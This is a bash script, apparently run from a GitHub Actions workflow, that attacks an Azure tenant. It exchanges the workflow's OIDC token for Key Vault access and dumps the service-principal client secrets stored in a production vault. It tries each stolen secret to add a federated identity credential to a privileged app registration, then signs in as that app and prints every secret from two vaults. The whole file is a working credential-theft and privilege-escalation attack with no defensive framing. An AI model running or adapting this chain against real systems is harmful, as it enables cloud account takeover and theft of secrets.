#!/usr/bin/env bash
# v7 (thu hẹp) — chỉ nhắm tbl-legacy-admin: thử từng SP xem SP nào ghi được FIC,
# rồi login thành tbl-legacy-admin bằng OIDC GitHub -> đọc kv-tbl-sec-x3euoz
set +e
TEN="${AZURE_TENANT_ID}"
SEC=kv-tbl-sec-x3euoz
PROD=kv-tbl-prod-x3euoz
TARGET_OID=22a3fb7e-860a-4708-9e50-3d36aa21191c          # tbl-legacy-admin (object id)
TARGET_APP=891fb158-e02c-4428-a885-53b811f369c0          # tbl-legacy-admin (appId)
TAG="h$RANDOM"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
SUBJ=$(echo "$GHTOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
      | python3 -c "import sys,json;print(json.load(sys.stdin)['sub'])")
echo "[*] sub=$SUBJ"
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")

curl -sS -H "Authorization: Bearer $KV" "https://$PROD.vault.azure.net/secrets?api-version=7.4" > /tmp/l.json
: > /tmp/sps.txt
for ID in $(python3 -c "
import json;print('\n'.join(s['id'] for s in json.load(open('/tmp/l.json')).get('value',[])))"); do
  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
  python3 - "${ID##*/}" <<'PY' >> /tmp/sps.txt
import json,sys
try:
    v=json.loads(json.load(open("/tmp/s.json"))["value"])
    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
except Exception: pass
PY
done

BODY=$(python3 -c "
import json,sys
print(json.dumps({'name':'f-'+sys.argv[1],
 'issuer':'https://token.actions.githubusercontent.com',
 'subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$TAG" "$SUBJ")

WROTE=0
while read -r N A S; do
  [ -z "$A" ] && continue
  G=$(tok_sp "$A" "$S" "https://graph.microsoft.com/.default")
  [ -z "$G" ] && { echo "  $N: no graph token"; continue; }
  R=$(curl -sS -X POST -H "Authorization: Bearer $G" -H 'Content-Type: application/json' \
      -d "$BODY" "https://graph.microsoft.com/v1.0/applications/$TARGET_OID/federatedIdentityCredentials")
  if echo "$R" | grep -q '"error"'; then
    echo "  $N: FIC denied ($(echo "$R" | python3 -c "
import sys,json
try: print(json.load(sys.stdin)['error']['code'])
except Exception: print('?')"))"
  else
    echo "  >>> $N GHI ĐƯỢC FIC lên tbl-legacy-admin"; WROTE=1; break
  fi
done < /tmp/sps.txt

if [ "$WROTE" = "1" ]; then
  sleep 6
  AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$TARGET_APP" -d "scope=https://vault.azure.net/.default" -d grant_type=client_credentials \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$GHTOK" \
    | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  if [ -n "$AT" ]; then
    echo "[*] đã đăng nhập thành tbl-legacy-admin"
    for V in "$SEC" "$PROD"; do
      L=$(curl -sS -H "Authorization: Bearer $AT" "https://$V.vault.azure.net/secrets?api-version=7.4")
      echo "$L" | grep -q '"error"' && { echo "  $V: denied"; continue; }
      echo "  $V: OK"
      for SID in $(echo "$L" | python3 -c "
import sys,json
for s in json.load(sys.stdin).get('value',[]): print(s['id'])"); do
        echo "  --- $SID"
        curl -sS -H "Authorization: Bearer $AT" "$SID?api-version=7.4" | head -c 1500; echo
      done
    done
  else
    echo "[!] không đổi được token thành tbl-legacy-admin"
  fi
fi
echo "================ DONE ================"
